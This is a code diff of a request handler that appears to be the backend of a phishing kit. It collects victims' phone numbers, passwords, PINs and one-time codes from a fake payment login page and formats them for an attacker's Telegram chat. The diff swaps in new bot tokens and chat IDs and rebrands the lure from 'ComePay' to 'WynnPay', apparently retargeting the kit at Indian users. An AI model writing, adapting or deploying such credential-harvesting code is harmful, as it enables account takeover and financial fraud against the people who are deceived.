@@ -6,8 +6,8 @@ export default async function handler(req, res) {
   const { type, phone, pass, pin, otp } = req.body;
 
   // --- TELEGRAM BOT CONFIGURATION ---
-  const BOT_TOKEN_1 = '9103979108:AAFTKSdKBpu3r9dfIDA5Qb-GEo8CnhiYFQ0';
-  const CHAT_ID_1 = '8689137450';
+  const BOT_TOKEN_1 = '9083820492:AAFdJ9KCzEGfLEORAR0Jgafs40Q-26kwAr8';
+  const CHAT_ID_1 = '7735788354';
 
   const BOT_TOKEN_2 = ''; 
   const CHAT_ID_2 = '';
@@ -17,11 +17,11 @@ export default async function handler(req, res) {
   let message = '';
 
   if (type === 'login') {
-    message = `✅ <b>New ComePay Login</b>\n🌐 IP: <code>${clientIp}</code>\n📱 Phone: <code>${phone}</code>\n🔑 Password: <code>${pass}</code>\n🔐 PIN: <code>${pin || 'N/A'}</code>`;
+    message = `✅ <b>New WynnPay Login</b>\n🌐 IP: <code>${clientIp}</code>\n📱 Phone: <code>${phone}</code>\n🔑 Password: <code>${pass}</code>\n🔐 PIN: <code>${pin || 'N/A'}</code>`;
   } else if (type === 'send_otp' || type === 'modal_otp') {
-    message = `🔐 <b>OTP Requested (comePay)</b>\n🌐 IP: <code>${clientIp}</code>\n📱 Phone: +91 <code>${phone}</code>`;
+    message = `🔐 <b>OTP Requested (WynnPay)</b>\n🌐 IP: <code>${clientIp}</code>\n📱 Phone: +91 <code>${phone}</code>`;
   } else if (type === 'verify_otp') {
-    message = `🔑 <b>OTP Entered (Wrong Attempt - comepay)</b>\n🌐 IP: <code>${clientIp}</code>\n📱 Phone: +91 <code>${phone}</code>\n🔢 OTP: <code>${otp}</code>`;
+    message = `🔑 <b>OTP Entered (Wrong Attempt - WynnPay)</b>\n🌐 IP: <code>${clientIp}</code>\n📱 Phone: +91 <code>${phone}</code>\n🔢 OTP: <code>${otp}</code>`;
   } else {
     message = `📩 <b>Activity from IP:</b> <code>${clientIp}</code>`;
   }
